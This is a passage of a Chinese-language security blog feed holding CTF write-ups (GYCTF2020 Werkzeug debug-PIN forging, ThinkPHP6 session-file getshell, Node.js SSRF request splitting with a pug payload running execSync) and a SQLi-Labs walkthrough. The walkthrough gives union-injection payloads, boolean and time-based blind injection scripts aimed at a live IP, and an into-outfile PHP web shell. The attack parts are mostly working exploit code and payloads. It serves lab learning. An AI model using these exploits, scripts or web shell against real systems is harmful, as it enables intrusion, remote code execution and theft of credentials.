class="string">'1834da85a17efb2029d4a9c8e8f71fe40a96862055c636788c9835665e8e3359'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>
<p>得到PIN码：<code>119-747-372</code></p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200306184649989.png" alt="在这里插入图片描述"></p>
<p>输入PIN后就可以在python终端任意执行代码了：</p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/202003061846353.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="EasyThinking"><a href="#EasyThinking" class="headerlink" title="EasyThinking"></a>EasyThinking</h1><p>这一题利用的是ThinkPHP6.0任意文件创建漏洞，分析可以参考这篇文章：<a href="https://www.anquanke.com/post/id/197261" target="_blank" rel="noopener">ThinkPHP6.0任意文件创建分析</a></p>
<p>简单说就是这个漏洞可以通过session来任意创建文件（文件名可控），并且当session里的数据可控的话，我们就可以控制创建的文件的内容，从而getshell。</p>
<p>扫描发现/<a href="http://www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：" target="_blank" rel="noopener">www.zip下载源码，除了注册和登录外还有一个搜索功能，通过源码可以看到我们搜索的值会被写入session中，因此利用我们就可以利用这个漏洞任意创建内容可控的文件：</a></p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315115458626.png" alt="在这里插入图片描述"></p>
<p>首先注册一个用户，并在登陆的时候将PHPSESSID的值改为长度为32的php文件名，如<code>1111111111111111111111111111.php</code>：</p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315120241769.png" alt="在这里插入图片描述"></p>
<p>然后在搜索功能中输入文件的内容：<br><img src="/2020/03/06/GYCTF2020-Writeup/20200315120711196.png" alt="在这里插入图片描述"></p>
<p>Thinkphp6默认把session文件存在/runtime/session目录下面，并保存为sess_xxx的形式：</p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/202003151150596.png" alt="在这里插入图片描述"></p>
<p>所以访问<code>/runtime/session/sess_1111111111111111111111111111.php</code>就是我们写入的文件：</p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315120918971.png" alt="在这里插入图片描述"></p>
<p>然后就是bypass disable functions了，直接上传&lt;php7.4的通杀POC执行/readflag即可：</p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315121416838.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="Node-Game"><a href="#Node-Game" class="headerlink" title="Node Game"></a>Node Game</h1><blockquote>
<p>首先放上出题人的<a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game" target="_blank" rel="noopener">writeup。</a></p>
</blockquote>
<p>这题给了源码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>); <span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//SSRF</span></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error occurs!&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Example app listening at http://%s:%s"</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>大概看一下几个路由：</p>
<ul>
<li>/：会包含/template目录下的一个pug模板文件来用pub进行渲染<ul>
<li>/source：回显源码</li>
<li>/file_upload：限制了只能由127.0.0.1的ip进行文件上传，并且我们可以通过控制MIME进行目录穿越，从而将文件上传到任意目录</li>
<li>/core：通过q向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。</li>
</ul>
</li>
</ul>
<p>根据上面几点，可以大致判断是利用SSRF伪造本地ip进行文件上传，上传包含命令执行代码的pug文件（可以搜一下pug文件的代码格式）到/template目录下，然后用<code>?action=</code>来包含该文件。</p>
<p>现在问题就是如何用SSRF来进行文件上传，这里就是Node js的编码处理安全问题，可以参考这篇文章：<a href="https://xz.aliyun.com/t/2894" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894</a></p>
<p>如果对编码经过精心的构造，就可以通过拆分请求实现的SSRF攻击（也就是一种CRLF注入），通过换行让服务端将我们的第一次请求下面构造的报文内容，当作一次单独的HTTP请求，而这个构造的请求就是我们的文件上传请求了。</p>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315164810466.png" alt="在这里插入图片描述"><br>由上面文章中的内容可知，通常的换行<code>\r\n（%0D%0A）</code>，我们可以构造为<code>\u010D\u010A</code>。<br>同理其他的一些特殊字符，如<code>空格(%20)</code>构造编码为<code>\u0120</code>，<code>+(%2B)</code>构造编码构造为<code>\u012B</code>…</p>
<p>根据这个编码方式，就可以构造出拆分的请求从而SSRF了，参考<a href="http://iv4n.cc/2020-wp-vol1/#xctf%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB" target="_blank" rel="noopener">iv4n的exp</a>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""" HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">body = <span class="string">"""------WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="lethe.pug"</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval("glob"+"al.proce"+"ss.mainMo"+"dule.re"+"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()")</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string">------WebKitFormBoundarysAs7bV3fMHq0JXUt--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>.replace(<span class="string">'\n'</span>, <span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.format(len(body), body) \</span><br><span class="line">    .replace(<span class="string">'+'</span>, <span class="string">'\u012b'</span>)             \</span><br><span class="line">    .replace(<span class="string">' '</span>, <span class="string">'\u0120'</span>)             \</span><br><span class="line">    .replace(<span class="string">'\r\n'</span>, <span class="string">'\u010d\u010a'</span>)    \</span><br><span class="line">    .replace(<span class="string">'"'</span>, <span class="string">'\u0122'</span>)             \</span><br><span class="line">    .replace(<span class="string">"'"</span>, <span class="string">'\u0a27'</span>)             \</span><br><span class="line">    .replace(<span class="string">'['</span>, <span class="string">'\u015b'</span>)             \</span><br><span class="line">    .replace(<span class="string">']'</span>, <span class="string">'\u015d'</span>) \</span><br><span class="line">    + <span class="string">'GET'</span> + <span class="string">'\u0120'</span> + <span class="string">'/'</span></span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">'http://5750e068-33b5-4a65-a6bf-82412fdee97e.node3.buuoj.cn/core?q='</span> + payload)</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    <span class="string">'http://5750e068-33b5-4a65-a6bf-82412fdee97e.node3.buuoj.cn/?action=lethe'</span>).text)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/06/GYCTF2020-Writeup/20200315171235568.png" alt="在这里插入图片描述"></p>
<p><br></p>
<p>参考：<br><a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">新春战疫公益赛-ezsqli-出题小记</a><br><a href="http://iv4n.cc/2020-wp-vol1/" target="_blank" rel="noopener">http://iv4n.cc/2020-wp-vol1/</a></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLi-Labs通关笔记</title>
    <url>/2019/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p><code>?id=1&#39;</code> 单引号报错，存在注入</p>
<p><code>?id=1&#39; order by 4 %23&#39;</code>报错，存在三列</p>
<p><code>?id=-1&#39; union select 1,2,3%23</code> 发现2和3的位置可以回显，于是进行注入</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code><br>得到当前库下所有表名</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3%23</code><br>得到users表下的所有列名</p>
<p><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code><br>得到所有的username和password<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190716215108803.png" alt="在这里插入图片描述"></p>
<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>less-1用单引号闭合了，而这里的id是整型，其他的注入方法与less-1相同。</p>
<p>最终payload：<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code></p>
<p><br></p>
<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>区别是这里用<code>&#39;)</code>进行闭合</p>
<p>最终payload：<br><code>?id=-1&#39;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code><br><br></p>
<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>区别是这里用<code>&quot;)</code>进行闭合</p>
<p>最终payload：<br><code>?id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code></p>
<p><br></p>
<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>发现有回显”You are in………..”和不回显两种情况<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">and</span> <span class="attribute">1</span>=1%23   You are <span class="keyword">in</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>.</span><br><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">and</span> <span class="attribute">1</span>=2%23  不回显</span><br></pre></td></tr></table></figure></p>
<p>判断为盲注，这里可以直接用sqlmap跑出来，但为了学习，还是自己写个脚本吧！</p>
<p>脚本如下，只跑了一下库名，其他的类似，改一下payload即可：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bool-base script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-5/'</span></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?id=1' and substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'%23"</span></span><br><span class="line">        <span class="comment"># payload = f"?id=1' and substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'%23"</span></span><br><span class="line">        payload = <span class="string">f"?id=1' and substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'%23"</span> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">"You are in..........."</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">            data += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>同样是bool盲注，双引号报错，判断为双引号闭合，将less-5的脚本中payload的单引号改为双引号即可。<br><br></p>
<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>测试发现<code>id=1&#39;</code>报错，但把后面的语句注释掉扔报错，还有括号闭合，发现加两个括号判断为<code>((&#39;$id&#39;))</code>闭合。<br>根据提示Use outfile……，应该是具有导出什么的了。</p>
<p>（1）首先判断是否有权限：<br><code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code><br>没有报错，具有root权限。<br>（2）于是将数据导出：<br><code>?id=-1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;E:\\CTF\\less-7\\table.txt&quot;--+</code><br>导出所有表</p>
<p><code>?id=-1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) into outfile &quot;E:\\CTF\\less-7\\column.txt&quot;--+</code><br>导出user表中所有列名</p>
<p><code>?id=-1&#39;)) union select 1,2,(select group_concat(username,password) from users) into outfile &quot;E:\\CTF\\less-7\\data.txt&quot;--+</code><br>导出用户名和密码</p>
<p>注意：在Mysql中，需要注意路径转义的问题，即用<code>\\</code>分隔。</p>
<p>另一种也可以向根目录下写入一句话木马，再用菜刀连接：<br><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\PHPWAMP_IN3\\wwwroot\\sqli-labs-master\\Less-7\\shell.php&quot;--+</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/2019071720415417.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>单引号闭合的盲注，用less-5的脚本跑一下即可。<br><br></p>
<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p>发现页面无论对错都只回显<code>You are in...........</code></p>
<p>测试<code>?id=1&#39; and sleep(3)%23</code> 页面会延时3秒再回显，判断为时间盲注</p>
<p>脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># less-9 time-base script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-9/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?id=1' and if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)%23"</span></span><br><span class="line">        <span class="comment"># payload = f"?id=1' and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)%23"</span></span><br><span class="line">        payload = <span class="string">f"?id=1' and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(2),1)%23"</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>双引号闭合的时间盲注。</p>
<p>稍微改一下less-9的脚本即可：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># less-10 script</span></span><br><span class="line"><span class="comment"># auther：Lethe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://43.247.91.228:84/Less-10/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_'</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="comment"># payload = f"?id=1\" and if((substr(binary database(),&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)%23"</span></span><br><span class="line">        <span class="comment"># payload = f"?id=1\" and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)='&#123;j&#125;'),sleep(2),1)%23"</span></span><br><span class="line">        payload = <span class="string">f"?id=1\" and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'),sleep(2),1)%23"</span> </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            data += j</span><br><span class="line">            print(data)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>是一个登录框，后端语句为:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure></p>
<p>所有构造万能密码即可：<br>即Username为<code>1&#39; or 1=1#</code>，Password为任意值。</p>
<p>因为这里是Post方式传到后端，因此注释符只能用<code>#</code><br><br></p>
<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><p>与上题的区别是这里用<code>(&quot;$uname&quot;)</code>进行闭合</p>
<p>因此构造Username为<code>1&quot;) or 1=1#</code><br><br></p>
<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h4><p>闭合方式为：<code>(&#39;$uname&#39;)</code></p>
<p>因此构造Username为<code>1&#39;) or 1=1#</code><br><br></p>
<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h4><p>闭合方式为：<code>&quot;$uname&quot;</code></p>
